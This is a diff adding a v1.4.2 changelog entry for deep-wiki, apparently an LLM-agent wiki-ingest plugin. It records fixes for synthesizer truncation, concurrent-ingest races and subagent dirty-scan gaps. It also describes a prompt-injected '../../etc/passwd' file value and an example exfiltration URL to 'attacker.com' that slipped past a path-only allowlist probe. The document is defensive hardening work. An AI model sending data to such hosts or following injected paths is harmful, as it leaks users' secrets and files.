@@ -2,6 +2,291 @@
 
 All notable changes to deep-wiki are documented here.
 
+## [1.4.2] — 2026-05-07
+
+Patch release closing four v1.4.1 backlog items captured in
+`docs/handoff-2026-05-06-v1.4.2.md`. Two are field-issue fixes uncovered
+by v1.4.1 cache-active dogfood (F1, F2 deferred from /deep-review round 1
+I1); two are deferred quality items (B3 phase telemetry from v1.4.0
+plan §10.2; I2 V-2/V-3 probe full-URL match from /deep-review rounds 1+2).
+Single-source + multi-source ingest paths are spec-equivalent to v1.4.1
+(NOT byte-identical — F1 disk-authoritative read + F2 §3.9 4th invocation
+site change the runtime invariants). Wiki schema additive only
+(`phase_timing_ms` field in `ingest` log lines; `wiki-lint` Step 6
+LOG-INVARIANT scan unaffected).
+
+**Mandatory verbatim known-limitations language carried forward from
+v1.4.1 §11.5 (re-stated for transparency):**
+
+- **L1**: V-0 PASS via Mechanism B is best-effort — Claude Code runtime
+  does not expose dispatch metadata API. Track C v2 deferred to v1.5.0+
+  pending runtime API support. **v1.4.2 addendum:** I2 fix improves
+  V-2/V-3 probe fidelity (full-URL allowlist comparison), but the
+  empirical SECOND run against v1.4.1 final agent files remains deferred
+  (sandbox orchestration workstream); CHANGELOG retains "best-effort"
+  framing without empirical addendum until SECOND run completes.
+- **L2**: §3.9 dirty-scan covers `<wiki_root>/`-internal mutations only;
+  off-root writes (e.g. `/tmp/`) NOT detected. v1.4.0 dogfood failure
+  mode (workers writing `/tmp/v140-workers-out/*`) is NOT covered by
+  §3.9. v1.4.1 was layered defense-in-depth; v1.4.2 F2 extends bracketing
+  to the Stage 1 dispatch (single-source) but does NOT widen the
+  off-root scope. Process-level sandboxing remains v1.5.0+ scope.
+
+### Bug fixes
+
+- **F1 (HIGH) — synthesizer `existing_page_body` truncation false-positive
+  C3 abort.** v1.4.1 cache-active dogfood (post-`/reload-plugins`)
+  observed Stage 1 LLM emitting dramatically-truncated `existing_page_body`
+  for update entries (12377 bytes disk → 725 bytes emit; 20071 bytes disk
+  → 587 bytes emit). Main computed C3 hash baseline from truncated bytes,
+  so Step 7.6.C C3 check always reported "concurrent ingest detected"
+  against actual disk bytes — every update aborted. Pre-v1.4.2 contract
+  trusted synthesizer's emit; v1.4.2 contract has main re-read pages from
+  DISK after Stage 1 returns and use disk bytes as the C3 hash baseline
+  AND as the Stage 2 worker / inline-write synthesis context. Subsumes the
+  prior P6 round-1 hash-from-emit compute pass — no separate compute
+  needed because main reads disk directly. `agents/wiki-synthesizer-analysis.md`
+  Rule 4 strengthened to require FULL VERBATIM bytes (defensive contract;
+  if synthesizer emits short, main authoritatively recovers from disk).
+  Single-source path only — multi-source A4 (workers, not analysis-mode)
+  has no `existing_body_hash` field on entries.
+
+  **Post-impl review fixups (3-way /deep-review on the v1.4.2 impl branch
+  before merge):**
+  - **F1.1 (2/3 reviewer agreement)** — sub-threshold drift escalation.
+    Stage 1's `inline_bodies` are generated from the truncated emit
+    BEFORE main re-reads disk. Writing those inline_bodies on a drift-
+    detected entry would silently corrupt unrelated sections (synthesizer's
+    Rule 5 + `preserve_sections` merge logic relied on full prior page
+    context). Pre-v1.4.2 caught this LOUDLY via C3 abort; the v1.4.2
+    base disk-read recovers the C3 baseline but does NOT restore Stage 1
+    synthesis. Fix: when ANY drift detected on a sub-threshold entry,
+    force the A5 fanout path so Stage 2 page-writer workers re-synthesize
+    each affected page from disk-bytes context. Discards stale
+    inline_bodies. Preserves the v1.4.1 LOUD-failure property for affected
+    pages while recovering retry-correctness.
+  - **F1.2 (2/3 reviewer agreement)** — PARTIAL_FAIL preservation across
+    Step 7.6.C reset. F1's gate may populate FAILED_PAGES (basename
+    invalid / file absent / disk read failed) and set PARTIAL_FAIL=true
+    BEFORE Step 7.6.C runs. The shared atomic-write block resets
+    PARTIAL_FAIL=false and only re-toggles based on FAILED_WORKERS (P5
+    pattern from v1.4.0). Without preservation, F1-dropped pages are
+    logged as failed but never receive the retry sentinel → next session
+    skips them. Fix: mirror the P5 pattern for FAILED_PAGES at Step 7.6.C
+    entry — `if [[ ${#FAILED_PAGES[@]} -gt 0 ]]; then PARTIAL_FAIL=true; fi`.
+  - **F1.3 (single-reviewer Codex P1)** — basename traversal guard.
+    F1 gate constructed `page_path="$WIKI_ROOT/pages/${entry.file}"` and
+    cat'd it BEFORE the existing Step 7.6.C basename guard. A prompt-
+    injected `entry.file = "../../etc/passwd"` would read OUTSIDE
+    `<wiki_root>/pages` and place those bytes into Stage 2 / inline-write
+    context. Fix: apply `^[a-z0-9][a-z0-9-]*\.md$` regex BEFORE
+    constructing page_path (same regex as Step 7.6.B Gate 3.5 + Step
+    7.6.C defense-in-depth).
+  - **F1.4 + F1.5 (single-reviewer Opus C2 + C3)** — agent doc + CHANGELOG
+    precision. Pre-fixup wording claimed "byte-identical Stage 3 hashing"
+    and "synthesizer's existing_page_body flows to Stage 2 workers as
+    synthesis context." Both are incorrect post-F1: `$(cat …)` strips
+    trailing newlines (asymmetric vs. v1.4.1's `printf '%s' "$emit"`
+    hashing of compliant agents), and main UNCONDITIONALLY overwrites
+    synth bytes with disk bytes before Stage 2 dispatch. Fix: drop
+    "byte-identical" claim, document that Stage 3 decisions are equivalent
+    via symmetric `$(cat)` byte-stripping; rewrite Rule 4 + field
+    semantics so spec accurately reflects synth bytes → telemetry-only
+    contract.
+  - **R2.F1.6 (2/3 reviewer agreement, 2nd-round /deep-review)** —
+    concurrent-ingest baseline race. Pre-R2 fixup F1 size-delta heuristic
+    (>4 bytes → escalate) only caught LARGE drifts. Concurrent
+    `/wiki-ingest` commits during Stage 1 LLM execution that produce
+    same-size byte changes (or truncation patterns within the EOL
+    tolerance band) silently became the new C3 baseline → Stage 3 passed
+    C3 → our session overwrote the concurrent commit. Fix: replace
+    size-delta with HASH-COMPARE between synth's emit and disk read.
+    Any byte-level difference triggers F1_DRIFT_DETECTED → force A5
+    fanout per F1.1 escalation logic. Stage 2 worker re-synthesizes from
+    current disk bytes — concurrent commit's content is preserved as the
+    worker's input, our session's source contribution merges on top.
+    Closes the T0→T1 (Stage 1 read → F1 cat) silent-window gap.
+  - **R2.F1.7 (2/3 reviewer agreement, 2nd-round /deep-review)** —
+    all-dropped → terminal ingest-skip bypass. Pre-R2 fixup `len(page_plan)
+    == 0` routed unconditionally through `do_ingest_skip_terminal_under_
+    lock` which emits `ingest-skip` log line + promotes source as
+    accounted for. If F1 dropped ALL update entries (basename invalid /
+    page absent / disk read failed), the source got promoted as a clean
+    skip without writing the partial_fail sentinel → next session never
+    retried → permanent silent failure. Fix: gate empty-page_plan terminal
+    skip on FAILED_PAGES being EMPTY. When non-empty (all-F1-dropped),
+    route through new `do_all_failed_under_lock` (Step 7.5.B) which
+    mirrors Step 7.7.B "all-fail" finalization: acquires lock, writes
+    partial_fail sentinel for the source slug, emits `ingest` log line
+    with `pages_failed=[F1-dropped]`, does NOT promote `.pending-scan`.
+
+**3rd-round /deep-review fixups (5 critical + 2 warning, all ACCEPT):**
+
+The 2nd-round fixup commit introduced `do_all_failed_under_lock` (novel
+~30-line function). 3rd-round /deep-review on this novel code surfaced
+5 criticals + 2 warnings — direct regressions in the new code, not in
+the v1.4.2 base design.
+
+  - **R3.P2.1 (2/3 reviewer agreement, Codex review P2 + Codex
+    adversarial high)** — slug vs. descriptor mismatch. Caller passed
+    `SOURCES[0]` (the descriptor encoding `slug|origin|type`) where
+    function expected `slug`. Result: yaml path constructed as
+    `<wiki>/.wiki-meta/sources/<slug|origin|type>.yaml` → wrong path
+    → partial_fail sentinel never landed at canonical location → Step
+    1.5's partial-fail-recovery cascading detection missed. Fix: caller
+    extracts slug via `slug="${SOURCES[0]%%|*}"` before invocation.
+  - **R3.P2.2 (2/3 reviewer agreement, Codex review P2 + Codex
+    adversarial medium)** — 3-strike retry counter missing. Step 7.5.M-D
+    multi-source path has the `<wiki>/.wiki-meta/.pending-scan-retry-count`
+    counter for stuck-window recovery (`ingest-fail` action emits on 3rd
+    consecutive same-window failure + promotes `.pending-scan`).
+    `do_all_failed_under_lock` did not increment this counter, so a
+    persistent F1 all-drop scenario (e.g., synthesizer hallucinating
+    absent pages repeatedly) loops indefinitely. Fix: mirror Step 7.5.M-D
+    pattern — read counter, increment, emit `ingest-fail` + promote on
+    count≥3, otherwise emit `ingest` with `pages_failed`.
+  - **R3.C-1 (single-reviewer Opus)** — `mkdir … exit 1` mishandling.
+    Pre-R3 fixup `mkdir … || { echo "Wiki locked"; exit 1; }` would
+    terminate the script before the caller's user-facing exit message
+    AND before any partial_fail signal could be written for benign
+    concurrent-ingest cases. Fix: soft-fail with `if ! mkdir … 2>/dev/null;
+    then echo WARN; return 1; fi`. Plus added `trap - EXIT` after explicit
+    rmdir (mirror Step 7.7.B + Step 7.6.G pattern).
+  - **R3.C-2 (single-reviewer Opus)** — first-ingest baseline yaml
+    materialization missing. Step 7.7.B's R4-Adv-Adv-2 fix explicitly
+    materializes a baseline yaml when the source's yaml does not exist
+    yet (brand-new source whose first ingest hits all-fail).
+    `do_all_failed_under_lock` claimed to mirror Step 7.7.B but was
+    missing this block — first-ingest all-F1-dropped would produce a
+    yaml with only the partial_fail block, missing `id/type/origin/
+    content_hash/pages_created/pages_updated`. Fix: inline the same
+    baseline materialization block at function entry.
+  - **R3.C-3 (single-reviewer Opus)** — `FAILED_PAGE_FILES` parallel
+    array population. F1 loop pushed only `FAILED_PAGES`; the function
+    body's `printf '%s\n' "${FAILED_PAGE_FILES[@]}" | jq -R . | jq -s -c .`
+    expansion under `set +u` produces `[""]` (the W1 round-2 bug shape),
+    under `set -u` aborts the script with unbound-variable. Both
+    outcomes defeat R2.F1.7's stated goal. Fix: add explicit
+    `FAILED_PAGE_FILES+=("${entry.file}")` after each F1 `FAILED_PAGES+=`
+    push (3 sites — basename invalid / page absent / disk read fail) +
+    explicit `FAILED_PAGES=()` `FAILED_PAGE_FILES=()` init at top of
+    `if sources_count == 1:` block.
+  - **R3.W-1 (single-reviewer Opus)** — `phase_timing_ms.stage_3_write`
+    formula. Pre-R3 fixup computed `LOG_EMIT_MS - INGEST_T0_MS` — same
+    as `total`, violating the documented `total >= sum(stages)`
+    invariant. Fix: caller captures `STAGE_3_START_MS_FAIL` immediately
+    before invoking the function; function's compute uses
+    `LOG_EMIT_MS - STAGE_3_START_MS_FAIL` for stage_3_write, scoping to
+    lock+yaml+log emit only. B3.1 path-coverage matrix updated with
+    new "Single-source F1 all-dropped" row.
+  - **R3.W-2 (single-reviewer Opus)** — reason taxonomy normalization.
+    Pre-R3 fixup used `"all_f1_dropped"` (snake_case) while existing
+    Step 7.6.F vocabulary used space-separated phrases (`"stage 2
+    worker fail"`, `"all workers failed"`). Fix: normalized to
+    `"all f1 dropped"` and added to inline taxonomy at line ~2068.
+
+- **F2 (MEDIUM) — single-source Stage 1 dispatch §3.9 bracketing gap.**
+  v1.4.1 §3.9 worker-mutation dirty-scan brackets fire at 3 dispatch
+  sites (Step 7.5.M-A multi-source A4 fanout, Step 7.5.M-B Case B2
+  collision second-pass, Step 7.6.B-post single-source A5 fanout) but
+  did NOT bracket the single-source Stage 1 analysis dispatch
+  (`invoke deep-wiki:wiki-synthesizer-analysis` in Step 7.5). A
+  misresolved or downgraded analysis subagent could mutate `<wiki_root>/`
+  during Stage 1 LLM execution, undetected. v1.4.2 adds a 4th invocation
+  site (label `"A5-analysis"`) immediately bracketing the Stage 1
+  dispatch. Pre-snapshot fires before the dispatch; post-scan after
+  Stage 1 returns and BEFORE the page_plan branch decision (sub-threshold
+  inline vs. A5 fanout downstream branching is irrelevant — Stage 1
+  mutation is caught regardless). `WIKI_TEST_MODE=1` env-gated;
+  production cost unchanged.
+
+### Telemetry
+
+  **Post-impl review fixup (B3.1, single-reviewer Opus C1)** — path-coverage
+  matrix vs. Step 10 omission rule self-contradiction. Pre-fixup matrix
+  listed `Single-source empty page_plan terminal-skip`, `Re-ingest
+  hash-skip`, `Ingest-fail / 3-strike abort` paths with phase_timing_ms
+  schema, but Step 10 omission rule explicitly states the field is
+  emitted only on `ingest` lifecycle action lines (not `ingest-skip` /
+  `ingest-repair` / `ingest-fail`). Fix: rewrite path-coverage matrix as
+  a 4-column table distinguishing "phase timing emitted" vs. "Step 10
+  bypass" with per-stage descriptions. Implementer mental model now
+  unambiguous. Also added W3 fixup — `${var:-0}` defaultization on the
+  delta-compute pseudocode for set -u tolerance.
+
+- **B3 — `phase_timing_ms` in `log.jsonl` `ingest` lines.** Deferred from
+  v1.4.0 plan §10.2; v1.4.0 dogfood measured ~17 minutes wall-clock with
+  anecdotal Stage 1 ~7 min + Stage 2 ~10 min splits but no per-phase timing
+  was recorded, so the breakdown was unverifiable post-hoc. v1.4.2 adds
+  a `_ts_ms` helper (Bash 3.2 portable; python3 preferred for ms precision,
+  `date +%s000` fallback for second precision) and threads timestamp
+  captures through Step 1 entry / Step 7.5 single-source / Step 7.5.M-A
+  multi-source / Step 7.6.A A5 fanout / Step 7.6.B-post / Step 7.6.C
+  Stage 3 lock acquire / Step 7.5.M-C multi-source atomic-write entry /
+  Step 10 log emit. Ingest line emits new field
+  `phase_timing_ms: {stage_1_analysis, stage_2_fanout, stage_3_write,
+  total}` (all ms integers). **Schema-additive** — `wiki-lint` Step 6
+  LOG-INVARIANT scan filters via
+  `select(.action != "ingest-repair") | .pages_created[]?` and ignores
+  unknown top-level fields. Field omitted from non-`ingest` lifecycle
+  actions (ingest-skip, ingest-repair, ingest-fail, lint, rebuild,
+  delete, query-filed, setup). Production cost: ~12 ms total per ingest
+  (~6 `_ts_ms` calls dominated by Python startup; warm-cache ~2 ms each),
+  negligible vs. minutes-scale LLM phases.
+
+### Testing infrastructure (probe quality)
+
+- **I2 — V-2/V-3 WebFetch probe full-URL allowlist comparison.** From
+  /deep-review rounds 1 + 2 (Codex review, single-reviewer raised twice).
+  `scripts/v0-probe/v2-v3-record.sh` previously recorded WebFetch
+  probes with only the request PATH (column 3 of stub log) and compared
+  against the path component of allowlist URLs. False-pass surface:
+  injected `https://attacker.com/v2-probe-feed?data=<exfiltrated_secret>`
+  matched allowed `https://example.com/v2-probe-feed` on the path-only
+  comparison. v1.4.2 adds a 6th TSV column to
+  `scripts/v0-probe/webfetch-stub-server.py` (`<host>` from request Host
+  header), and `v2-v3-record.sh` now extracts full URLs as
+  `<host><path>?<query>` (scheme stripped) for normalized comparison
+  against allowlist URLs. Backward-compatible: pre-v1.4.2 5-column logs
+  trigger lossy-mode detection and degrade to path-only comparison with
+  `lossy-pre-v1.4.2-log: ...` annotation in the notes column. Testing
+  infrastructure only — production agent behavior unaffected.
+
+  **Post-impl review fixup (W4, single-reviewer Opus)** — empty-log
+  short-circuit. Pre-fixup format-detect awk would treat an empty log
+  file as "not new format" and tag the run as `lossy-pre-v1.4.2-log` in
+  the notes column, falsely suggesting degraded probe infrastructure on
+  what is actually a clean PASS shape (no requests made = no
+  exfiltration attempt). Fix: `[ ! -s "$WEBFETCH_LOG" ]` short-circuit
+  before format detection, treating empty file as the explicit empty PASS
+  case.
+
+### Migration
+
+No external API changes from v1.4.1. Internal contract change is the
+F1 disk-authoritative read for `existing_body_hash`: hashing is consistent
+within Stage 3 — both F1 capture and C3 re-check use `$(cat …)`
+byte-stripping (POSIX command substitution drops trailing newlines), so
+the C3 comparison is symmetric and concurrent-ingest detection is
+preserved. Hash values are NOT byte-identical to v1.4.1 (v1.4.1 hashed
+`printf '%s' "$emit"` which preserved synthesizer's trailing newline if
+compliant; v1.4.2 hashes `$(cat)` output which strips them) — but Stage 3
+success/abort decisions remain equivalent for spec-compliant agents.
+Non-compliant emits (truncation drift) trigger a `WARN: synthesizer
+existing_page_body drift for ...` stderr line. Sub-threshold path with
+drift is escalated to A5 fanout (post-review F1.1 fixup) so Stage 2
+workers re-synthesize from disk-bytes context — preserves the v1.4.1
+LOUD-failure property for affected pages while recovering retry-correctness.
+
+### Acknowledgements
+
+- Handoff doc `docs/handoff-2026-05-06-v1.4.2.md` (gitignored author
+  artifact) drove the F1+F2+B3+I2 backlog ordering.
+- /deep-review rounds 1+2 from v1.4.1 cycle (Opus + Codex review +
+  Codex adversarial) flagged F2 (round 1 I1) and I2 (rounds 1+2,
+  single-reviewer Codex twice).
+- v1.4.1 cache-active dogfood (handoff §0) discovered F1 in the wild.
+
 ## [1.4.1] — 2026-05-06
 
 Trust-boundary closure (best-effort, layered defense). Splits the unified
